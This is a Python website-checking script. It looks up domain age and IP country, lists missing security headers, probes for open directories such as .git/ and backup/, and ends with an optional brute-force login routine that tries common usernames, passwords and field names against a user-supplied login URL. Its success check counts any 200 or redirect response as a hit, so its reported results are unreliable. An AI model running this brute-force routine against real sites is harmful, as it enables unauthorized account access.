# Developed by: inan demir

import whois
import requests
import socket
from urllib.parse import urlparse
from datetime import datetime

# Suspicious keywords to look for in URLs
keywords = ['login', 'secure', 'update', 'account', 'bank', 'verify', 'paypal', 'confirm']

# Common security headers that should be present
security_headers = [
    "X-Content-Type-Options",
    "X-Frame-Options",
    "X-XSS-Protection",
    "Content-Security-Policy",
    "Strict-Transport-Security"
]

# Directories to test for open listings
directories = ['admin/', 'test/', 'backup/', 'uploads/', '.git/', 'config/']

# Common usernames
usernames = [
    "admin", "administrator", "root", "user", "test"
]

# Common passwords
passwords = [
    "123456", "password", "123456789", "12345", "12345678",
    "qwerty", "abc123", "football", "1234567", "monkey",
    "letmein", "111111", "welcome", "admin123", "login",
    "princess", "solo", "passw0rd", "starwars", "dragon"
]

# Common login field name combinations
login_fields = [
    ("username", "password"),
    ("user", "pass"),
    ("login", "passwd"),
    ("email", "password"),
    ("usr", "pwd"),
    ("uname", "pword"),
    ("user_name", "user_pass"),
    ("userid", "userpassword"),
    ("loginid", "loginpass"),
    ("account", "password")
]

def get_domain_info(domain):
    try:
        info = whois.whois(domain)
        created = info.creation_date
        if isinstance(created, list):
            created = created[0]
        age = (datetime.now() - created).days
        return created.strftime("%Y-%m-%d"), age
    except:
        return "Unknown", "?"

def get_ip_info(domain):
    try:
        ip = socket.gethostbyname(domain)
        res = requests.get(f"http://ip-api.com/json/{ip}")
        country = res.json().get("country", "Unknown")
        return ip, country
    except:
        return "Unknown", "Unknown"

def check_https(url):
    return url.startswith("https://")

def check_keywords(url):
    return [k for k in keywords if k in url.lower()]

def check_missing_headers(url):
    try:
        res = requests.get(url, timeout=5)
        missing = [h for h in security_headers if h not in res.headers]
        return missing
    except:
        return ["Connection error"]

def check_open_directories(url):
    found = []
    for d in directories:
        test_url = url.rstrip('/') + '/' + d
        try:
            r = requests.get(test_url, timeout=3)
            if "Index of /" in r.text and r.status_code == 200:
                found.append(test_url)
        except:
            continue
    return found

def brute_force_login(url):
    print("Starting brute-force test...")
    attempts = 0
    for username in usernames:
        for password in passwords:
            for user_field, pass_field in login_fields:
                data = {user_field: username, pass_field: password}
                try:
                    res = requests.post(url, data=data, timeout=5)
                    attempts += 1
                    if "dashboard" in res.text.lower() or "welcome" in res.text.lower() or res.status_code in [200, 301, 302]:
                        print(f"Success: {username}:{password} ({user_field}/{pass_field})")
                        print(f"Total attempts: {attempts}")
                        return
                except:
                    continue
    print(f"Brute-force failed. Total attempts: {attempts}")

def analyze(url):
    parsed = urlparse(url)
    domain = parsed.netloc or parsed.path

    print(f"Target domain: {domain}")
    print(f"HTTPS enabled: {'Yes' if check_https(url) else 'No'}")

    created, age = get_domain_info(domain)
    print(f"Domain creation date: {created} ({age} days old)")

    suspicious = check_keywords(url)
    print(f"Suspicious keywords: {', '.join(suspicious) if suspicious else 'None'}")

    ip, country = get_ip_info(domain)
    print(f"IP Address: {ip}")
    print(f"Country: {country}")

    missing = check_missing_headers(url)
    print("Missing security headers:")
    for h in missing:
        print(f"- {h}")

    open_dirs = check_open_directories(url)
    if open_dirs:
        print("Open directories found:")
        for d in open_dirs:
            print(f"- {d}")
    else:
        print("No open directories detected.")

    login_url = input("Enter login URL for brute-force test (leave empty to skip): ").strip()
    if login_url:
        brute_force_login(login_url)

if __name__ == "__main__":
    target = input("Enter target URL (e.g., http://example.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    analyze(target)
    input("Press ENTER to exit.")
